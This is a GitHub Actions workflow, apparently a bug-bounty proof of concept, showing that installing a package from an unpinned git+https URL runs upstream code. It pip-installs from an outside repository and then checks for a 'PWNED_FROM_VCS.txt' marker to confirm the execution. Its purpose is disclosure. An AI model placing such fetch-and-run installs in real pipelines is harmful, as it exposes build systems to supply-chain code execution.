name: VRP PoC - Unpinned VCS RCE

on:
  workflow_dispatch:

jobs:
  poc-vcs-rce:
    name: ğŸ”“ PoC: Unpinned VCS executes upstream code
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v6
        with:
          python-version: '3.11'
      - name: ğŸ“¦ Install from unpinned VCS (vulnerable)
        run: |
          echo "Installing from unpinned git+https:// URL..."
          python3 -m pip install -U "git+https://github.com/reconsumeralization/tfdocs-poc-20250922181610"
      - name: ğŸ¯ Verify PoC execution marker
        run: |
          echo "Checking for execution marker..."
          ls -la
          if test -f PWNED_FROM_VCS.txt; then
            echo "âœ… [POC SUCCESS] Upstream code executed!"
            echo "ğŸ“„ Marker contents:"
            cat PWNED_FROM_VCS.txt
          else
            echo "âŒ [POC FAILED] No marker found"
            exit 1
          fi
